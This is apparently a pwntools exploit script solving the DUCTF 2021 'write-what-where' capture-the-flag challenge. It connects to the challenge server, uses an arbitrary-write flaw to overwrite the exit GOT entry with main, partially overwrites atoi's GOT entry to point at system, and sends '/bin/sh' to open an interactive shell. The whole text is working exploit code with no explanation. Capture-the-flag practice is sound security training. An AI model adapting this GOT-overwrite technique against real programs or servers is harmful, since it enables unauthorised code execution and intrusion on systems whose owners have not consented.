from pwn import *

s = remote('pwn-2021.duc.tf', 31920)
#s = process('./write-what-where')

#raw_input('DEBUG')

system = 0xfa600000
main = 0x4011a9
exit_plt = 0x000000404038
atoi_plt = 0x000000404030

s.sendafter(b'what?\n', p32(main))
payload = bytes(str(exit_plt), 'utf-8')
s.sendlineafter(b'where?\n', b'0' * (8 - len(payload)) + payload)

s.sendafter(b'what?\n', p32(system))
payload = bytes(str(atoi_plt - 2), 'utf-8')
s.sendlineafter(b'where?\n', b'0' * (8 - len(payload)) + payload)

s.sendafter(b'what?\n', b'A')
s.sendlineafter(b'where?\n', b'/bin/sh\x00')

s.interactive()
